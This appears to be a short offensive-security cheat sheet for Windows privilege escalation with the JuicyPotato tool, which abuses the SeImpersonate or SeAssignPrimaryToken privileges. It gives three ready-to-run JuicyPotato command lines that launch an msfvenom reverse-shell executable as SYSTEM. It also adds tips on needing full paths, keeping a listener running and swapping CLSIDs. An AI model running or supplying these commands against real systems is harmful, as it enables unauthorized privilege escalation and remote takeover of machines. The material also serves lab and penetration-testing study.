## --> can use if SeImpersonate or SeAssignPrimaryToken are set


https://github.com/ohpe/juicy-potato/releases
--> Run an msfvenom reverse shell .exe:
(Note, the "-l" is required but doesn't matter)
```
.\JuicyPotato.exe -t * -p C:\\Users\\Public\\Downloads\a.exe -l 5555
```

## Another example of the same thing:

```
.\JuicyPotato.exe -t * -p C:\\Users\\Public\\Downloads\\r.exe -l 3333
```

--> Basically JuicyPotato always creates a new process, so make sure you have a reverse shell going


## Another way
--> You always need the full path:
--> Sometimes your CLSID will not work, just pick a new one at:
https://ohpe.it/juicy-potato/CLSID/

.\JuicyPotato86.exe -l 6666 -p C:\wamp\www\PHP\fileManager\collectives\tmp\fileManager\collectives\DG0\test\r32.exe -t * -c '{03ca98d6-ff5d-49b8-abc6-03dd84127020}'